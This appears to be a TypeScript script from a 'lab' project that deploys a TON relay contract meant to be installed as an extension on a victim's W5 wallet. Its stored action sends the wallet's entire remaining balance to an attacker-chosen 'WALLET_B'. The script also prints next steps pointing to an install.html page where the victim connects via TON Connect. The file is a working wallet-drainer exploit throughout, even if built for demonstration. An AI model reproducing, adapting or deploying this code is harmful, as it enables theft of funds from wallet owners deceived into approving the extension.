import { mnemonicToPrivateKey } from "@ton/crypto";
import {
  Address,
  beginCell,
  contractAddress,
  internal,
  SendMode,
  toNano,
} from "@ton/core";
import { TonClient, WalletContractV5R1 } from "@ton/ton";
import { ActionSendMsg, packActionsList } from "./actions.js";
import { compileRelay } from "./compile-relay.js";
import { createMsgInternal } from "./utils.js";
import { networkGlobalId, requireEnv, tonClientOptions } from "./env.js";
import { resolveTriggerMnemonic } from "./payer.js";
import { saveConfig } from "./utils.js";
import { resolveVictimAddress } from "./victim.js";
import { writePublicConfig } from "./write-public-config.js";

async function main() {
  const walletB = Address.parse(requireEnv("WALLET_B"));
  const drainTon = process.env.DRAIN_AMOUNT ?? "0.1";
  const drainAmount = toNano(drainTon);

  const victimAddress = await resolveVictimAddress();

  const inner = packActionsList([
    new ActionSendMsg(
      SendMode.CARRY_ALL_REMAINING_BALANCE,
      createMsgInternal({ dest: walletB, value: 0n, bounce: false }),
    ),
  ]);

  const code = await compileRelay();
  const data = beginCell()
    .storeAddress(victimAddress)
    .storeRef(inner)
    .endCell();

  const init = { code, data };
  const relayAddress = contractAddress(0, init);

  const triggerMn = resolveTriggerMnemonic();
  const keyT = await mnemonicToPrivateKey(triggerMn.split(/\s+/));
  const payer = WalletContractV5R1.create({
    walletId: { networkGlobalId: networkGlobalId() },
    publicKey: keyT.publicKey,
    workchain: 0,
  });

  const client = new TonClient(tonClientOptions());
  const payerOpened = client.open(payer);

  console.log("Victim W5 (C):", victimAddress.toString());
  console.log("Receiver (B):", walletB.toString());
  console.log("Relay (extension):", relayAddress.toString());
  console.log("Drain amount:", drainTon, "TON");

  const seqno = await payerOpened.getSeqno();
  console.log("Payer seqno:", seqno, "— waiting 2s for rate limit...");
  await new Promise((r) => setTimeout(r, 2000));

  await payerOpened.sendTransfer({
    seqno,
    secretKey: keyT.secretKey,
    messages: [
      internal({
        to: relayAddress,
        value: toNano("0.05"),
        bounce: true,
        init,
        body: beginCell().endCell(),
      }),
    ],
    sendMode: SendMode.PAY_GAS_SEPARATELY + SendMode.IGNORE_ERRORS,
  });

  const labCfg = {
    relayAddress: relayAddress.toString(),
    walletA: victimAddress.toString(),
    walletB: walletB.toString(),
    innerActionsBoc: inner.toBoc().toString("base64"),
    drainAmount: drainTon,
  };

  saveConfig(labCfg);
  writePublicConfig(labCfg);

  console.log("\nDeployed. lab-config.json + public/config.json updated");
  console.log("Next: npm run serve:public → /install.html (TON Connect, victim W5)");
  console.log("      (optional) npm run install-ext if MNEMONIC_A is in .env");
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
